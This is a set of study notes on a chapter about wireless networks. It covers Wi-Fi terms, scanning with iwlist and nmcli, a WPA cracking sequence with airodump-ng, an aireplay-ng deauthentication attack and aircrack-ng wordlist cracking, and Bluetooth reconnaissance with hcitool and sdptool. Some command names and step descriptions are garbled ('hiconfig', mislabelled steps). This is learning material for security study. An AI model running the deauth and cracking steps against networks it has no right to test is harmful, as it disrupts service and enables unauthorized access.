## Chapter 14 Understanding and Inspecting Wireless Networks 

### *Wi-Fi Networks*
- `AP (access point)`: This is the device wireless users connect to for internet access.
- `ESSID (extended service set identifier)`: This is the same as the `SSID`, which we discussed in 

`Chapter 3`, but it can be used for multiple APs in a wireless LAN.

- `BSSID (basic service set identifier)`: This is the unique identifier of each AP, and it is the same as the `MAC address of the device`.
- `SSID (service set identifier)`: This is the name of the network.
- `Channels Wi-Fi` can operate on any one of 14 `channels (1–14)`. In the United States, Wi-Fi is limited to `channels 1–11.`
- `Wireless range` In the United States, a Wi-Fi AP must legally broadcast its signal at an upper limit of 0.5 watts. At this power, 

    it has a normal range of about 300 feet (100 meters). High-gain antennas can extend this range to as much as 20 miles.

### *Basic Wireless Commands*
- `ifconfig`
- `iwconfig`
- `iwlist {interface} {action}`: `iwlist wlan0 scan`

You can perform multiple actions with iwlist. For our purposes, we’ll use the scan action to see all the Wi-Fi APs in your area. 

(Note that with a standard antenna, your range will be 300–500 feet, but this can be extended with an inexpensive high-gain antenna.)

with this command (`iwlist wlan0 scan`)

- `nmcli`: *Network Manager Command Line Interface*
- `nmcli dev wifi`
- `nmcli dev wifi connect {AP-SSID} password {APpassword}`

    e.g: nmcli dev wifi connect Hackers-Arise password 12345678

### *Wi-Fi Recon with aircrack-ng*
- `airmon-ng {start|stop|restart} interface`
    e.g: airmon-ng start wlan0
- `airodump-ng` 

    e.g: `airodump-ng wlan0mon`
- `airmon-ng`
- `airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon`: Crack wifi for password 
- `aireplay-ng --deauth 100 -a 01:02:CC:DD:03:CF –c A0:A3:E2:44:7C:E5 wlan0mon`: Capture hash words 
- `aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap`: Filter hash words with wordlist 

### *Bluetooth Scanning and Reconnaissance*
- `bluez`: Scan Bluetooth
- `sudo apt update && sudo apt install bluez -y`: Install bluez
- `hiconfig`: Scanning Bluetooth
- `hiconfig {nameBluetooth} up`: 
    
    e.g: hiconfig hic0 up
- `hcitool scan`: Scanning bluetooth with `hcitool` 
- `hcitool inq`
- `hcitool --help`

### *Scanning for Services with sdptool*
- `sdptool browse {macAddress}`

    e.g: `sdptool browse 76:6E:46:63:72:66`

- `l2ping {MACaddress} -c {NumberOfPackets}`

    e.g: `l2ping 76:6E:46:63:72:66 -c 3`

### *Exercise* 
- `Do it by your own`
